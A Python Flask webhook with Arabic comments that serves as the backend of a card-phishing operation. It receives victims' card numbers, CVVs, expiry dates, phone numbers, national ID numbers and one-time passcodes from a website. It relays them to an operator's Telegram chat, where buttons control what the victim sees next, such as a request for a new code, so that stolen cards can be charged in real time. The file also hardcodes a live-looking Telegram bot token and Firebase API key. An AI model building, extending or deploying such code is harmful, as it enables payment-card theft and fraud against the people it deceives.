import os
import requests
from flask import Flask, jsonify, request

app = Flask(__name__)

# الثوابت الخاصة بك
TELEGRAM_TOKEN = "8913814349:AAG28vDRYbX4GZybnDijjibGlgzTuSleLyM"
CHAT_ID = "8462628086"
FIREBASE_PROJECT_ID = "jdjdnd-aaa9c"
FIREBASE_API_KEY = "AIzaSyCHF_hQDG4889pX4Cs5Ua18gHtsFP7ZR2k"


@app.route("/", methods=["GET"])
def index():
  return "Python Bot is active and running successfully!"


@app.route("/webhook", methods=["POST"])
def webhook():
  try:
    data = request.get_json()

    # 1. إذا كان الطلب قادماً من تيليجرام (ضغط الأزرار من الأدمن)
    if "callback_query" in data:
      cb = data["callback_query"]
      cb_id = cb["id"]
      cb_data = cb["data"]
      chat_id = cb["message"]["chat"]["id"]
      message_id = cb["message"]["message_id"]

      parts = cb_data.split("|")
      action = parts[0]
      orderId = parts[1]

      # تحديث الحالة في فايرستور (Firestore PATCH)
      firestore_url = (
          f"https://firestore.googleapis.com/v1/projects/{FIREBASE_PROJECT_ID}"
          f"/databases/(default)/documents/orders/{orderId}"
          f"?key={FIREBASE_API_KEY}&updateMask.fieldPaths=status"
      )

      payload = {"fields": {"status": {"stringValue": action}}}

      requests.patch(firestore_url, json=payload)

      # الرد على الزر في تيليجرام
      reply_text = "✅ تم التحديث بنجاح"
      if action == "SUCCESS":
        reply_text = "✅ تم قبول العملية وإظهار الفاتورة للعميل."
      elif action == "REQUEST_NEW_OTP":
        reply_text = "🔄 تم طلب رمز OTP جديد."
      elif action == "ERROR_INSUFFICIENT_FUNDS":
        reply_text = "💸 لا يوجد رصيد كافي."
      elif action == "ERROR_INVALID_CARD":
        reply_text = "🚫 بيانات البطاقة خاطئة."

      requests.post(
          f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
          json={
              "callback_query_id": cb_id,
              "text": reply_text,
              "show_alert": True,
          },
      )

      # تعديل الرسالة لتأكيد المعالجة
      original_text = cb["message"].get("text", "")
      new_text = original_text + f"\n\n📌 *الحالة المعتمدة:* `{reply_text} ✅`"
      requests.post(
          f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText",
          json={
              "chat_id": chat_id,
              "message_id": message_id,
              "text": new_text,
              "parse_mode": "Markdown",
          },
      )

      return jsonify({"status": "ok"})

    # 2. إذا كان الطلب قادماً من الموقع (طلب جديد، بطاقة، أو OTP)
    action = data.get("action")

    if action == "card_info":
      card_number = data.get("cardNumber")
      phone = data.get("phone")
      card_date = data.get("cardDate")
      card_cvv = data.get("cardCvv")

      text = (
          f"Mr: `{card_number}`\n\n📞: `{phone}`\n\n💳:"
          f" `{card_number}`\n\n📅: `{card_date}`\n\n🔒:"
          f" `{card_cvv}`\n========================================="
      )
      send_message(text, None)

    elif action == "new_order":
      order_id = data.get("orderId")
      text = (
          f"🛒 *طلب جديد #{order_id[:6]}*\n\n*بيانات الزبون*\nالاسم:"
          f" {data.get('name')}\nرقم الهوية: {data.get('nid', 'غير متوفر')}\nواتساب:"
          f" {data.get('phone')}\nالجنسية: {data.get('email', 'غير متوفر')}\nاجمالي:"
          f" {data.get('amount')}\nالدفع: {data.get('payType')}\nالدفعة الأولي:"
          f" {data.get('firstAmount')}\nالعنوان: {data.get('city')} -"
          f" {data.get('addr')}\nالجهاز:\n{data.get('itemsText')}\n\nاختر"
          " الإجراء:"
      )

      markup = {
          "inline_keyboard": [
              [
                  {
                      "text": "✅ 1. تظهر الفاتورة",
                      "callback_data": f"SUCCESS|{order_id}",
                  }
              ],
              [
                  {
                      "text": "❌ 2. الرمز خطأ",
                      "callback_data": f"REQUEST_NEW_OTP|{order_id}",
                  }
              ],
              [
                  {
                      "text": "💸 3. لا يوجد رصيد كافي",
                      "callback_data": f"ERROR_INSUFFICIENT_FUNDS|{order_id}",
                  }
              ],
              [
                  {
                      "text": "🚫 4. بيانات البطاقة خاطئة",
                      "callback_data": f"ERROR_INVALID_CARD|{order_id}",
                  }
              ],
          ]
      }
      send_message(text, markup)

    elif action == "verify_otp":
      order_id = data.get("orderId")
      text = (
          f"🔑 *رمز OTP مدخل جديد*\n\n🆔 رقم الطلب: `{order_id[:6]}`\n🔢 الرمز:"
          f" `{data.get('otp')}`\n\n⏳ العميل ينتظر 30 ثانية...\nاختر الإجراء"
          " الآن:"
      )

      markup = {
          "inline_keyboard": [
              [
                  {
                      "text": "✅ 1. تظهر الفاتورة",
                      "callback_data": f"SUCCESS|{order_id}",
                  }
              ],
              [
                  {
                      "text": "❌ 2. الرمز خطأ",
                      "callback_data": f"REQUEST_NEW_OTP|{order_id}",
                  }
              ],
              [
                  {
                      "text": "💸 3. لا يوجد رصيد كافي",
                      "callback_data": f"ERROR_INSUFFICIENT_FUNDS|{order_id}",
                  }
              ],
              [
                  {
                      "text": "🚫 4. بيانات البطاقة خاطئة",
                      "callback_data": f"ERROR_INVALID_CARD|{order_id}",
                  }
              ],
              [
                  {
                      "text": "🔄 5. طلب رمز جديد",
                      "callback_data": f"REQUEST_NEW_OTP|{order_id}",
                  }
              ],
          ]
      }
      send_message(text, markup)

    return jsonify({"status": "success"})
  except Exception as e:
    return jsonify({"error": str(e)}), 500


def send_message(text, markup):
  url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
  payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
  if markup:
    payload["reply_markup"] = markup
  requests.post(url, json=payload)


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
